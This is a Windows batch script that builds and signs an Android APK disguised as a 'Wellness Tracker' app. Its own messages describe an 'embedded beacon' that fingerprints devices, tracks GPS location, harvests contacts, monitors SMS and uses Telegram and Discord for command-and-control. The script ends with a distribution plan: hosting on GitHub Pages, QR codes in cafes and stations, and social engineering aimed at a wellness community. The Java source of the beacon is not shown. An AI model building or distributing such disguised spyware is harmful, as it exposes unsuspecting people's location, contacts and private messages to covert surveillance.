@echo off
echo Building Wellness Tracker APK with embedded beacon...

REM Set Android SDK paths (adjust these to your Android SDK location)
set ANDROID_SDK=C:\Users\%USERNAME%\AppData\Local\Android\Sdk
set BUILD_TOOLS=%ANDROID_SDK%\build-tools\34.0.0
set PLATFORM=%ANDROID_SDK%\platforms\android-34

REM Create directory structure
mkdir build\classes 2>nul
mkdir build\dex 2>nul
mkdir build\apk 2>nul
mkdir build\signed 2>nul

echo [1/6] Compiling Java source files...
javac -classpath "%PLATFORM%\android.jar" -d build\classes *.java

echo [2/6] Creating DEX file...
"%BUILD_TOOLS%\dx" --dex --output=build\dex\classes.dex build\classes

echo [3/6] Creating basic APK structure...
mkdir build\apk\META-INF 2>nul
copy AndroidManifest.xml build\apk\
copy build\dex\classes.dex build\apk\

REM Copy resources (create minimal resources)
mkdir build\apk\res\layout 2>nul
mkdir build\apk\res\values 2>nul
mkdir build\apk\res\drawable 2>nul

echo ^<?xml version="1.0" encoding="utf-8"?^> > build\apk\res\layout\activity_main.xml
echo ^<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" >> build\apk\res\layout\activity_main.xml
echo     android:layout_width="match_parent" >> build\apk\res\layout\activity_main.xml
echo     android:layout_height="match_parent" >> build\apk\res\layout\activity_main.xml
echo     android:orientation="vertical" >> build\apk\res\layout\activity_main.xml
echo     android:padding="20dp"^> >> build\apk\res\layout\activity_main.xml
echo     ^<TextView android:id="@+id/welcome_text" >> build\apk\res\layout\activity_main.xml
echo         android:layout_width="match_parent" >> build\apk\res\layout\activity_main.xml
echo         android:layout_height="wrap_content" >> build\apk\res\layout\activity_main.xml
echo         android:text="Wellness Tracker" >> build\apk\res\layout\activity_main.xml
echo         android:textSize="24sp" /^> >> build\apk\res\layout\activity_main.xml
echo     ^<Button android:id="@+id/btn_start_wellness" >> build\apk\res\layout\activity_main.xml
echo         android:layout_width="match_parent" >> build\apk\res\layout\activity_main.xml
echo         android:layout_height="wrap_content" >> build\apk\res\layout\activity_main.xml
echo         android:text="Start Wellness Journey" /^> >> build\apk\res\layout\activity_main.xml
echo     ^<Button android:id="@+id/btn_meditation" >> build\apk\res\layout\activity_main.xml
echo         android:layout_width="match_parent" >> build\apk\res\layout\activity_main.xml
echo         android:layout_height="wrap_content" >> build\apk\res\layout\activity_main.xml
echo         android:text="Guided Meditation" /^> >> build\apk\res\layout\activity_main.xml
echo     ^<Button android:id="@+id/btn_tracking" >> build\apk\res\layout\activity_main.xml
echo         android:layout_width="match_parent" >> build\apk\res\layout\activity_main.xml
echo         android:layout_height="wrap_content" >> build\apk\res\layout\activity_main.xml
echo         android:text="Habit Tracking" /^> >> build\apk\res\layout\activity_main.xml
echo ^</LinearLayout^> >> build\apk\res\layout\activity_main.xml

echo ^<?xml version="1.0" encoding="utf-8"?^> > build\apk\res\values\strings.xml
echo ^<resources^> >> build\apk\res\values\strings.xml
echo     ^<string name="app_name"^>Wellness Tracker^</string^> >> build\apk\res\values\strings.xml
echo ^</resources^> >> build\apk\res\values\strings.xml

echo [4/6] Building unsigned APK...
cd build\apk
"%BUILD_TOOLS%\aapt" package -f -M AndroidManifest.xml -I "%PLATFORM%\android.jar" -F ..\wellness-tracker-unsigned.apk .
cd ..\..

echo [5/6] Generating signing key...
if not exist wellness-key.keystore (
    keytool -genkey -v -keystore wellness-key.keystore -alias wellness -keyalg RSA -keysize 2048 -validity 10000 -storepass wellness123 -keypass wellness123 -dname "CN=Wellness Tracker, OU=Health, O=Holistic Apps, L=Copenhagen, S=Denmark, C=DK"
)

echo [6/6] Signing APK...
"%BUILD_TOOLS%\apksigner" sign --ks wellness-key.keystore --ks-key-alias wellness --ks-pass pass:wellness123 --key-pass pass:wellness123 --out build\signed\wellness-tracker.apk build\wellness-tracker-unsigned.apk

echo.
echo ✅ APK Build Complete!
echo.
echo 📱 Signed APK: build\signed\wellness-tracker.apk
echo 🔑 Keystore: wellness-key.keystore  
echo.
echo 🚀 Ready for deployment:
echo    - Upload to GitHub Pages as wellness-app.apk
echo    - Distribute via QR codes in cafes/stations  
echo    - Social engineering via wellness community
echo.
echo 📊 Beacon features included:
echo    - Device fingerprinting (IMEI, Android ID)
echo    - GPS location tracking
echo    - Contact harvesting
echo    - SMS monitoring  
echo    - Network reconnaissance
echo    - C2 via Telegram + Discord
echo.
pause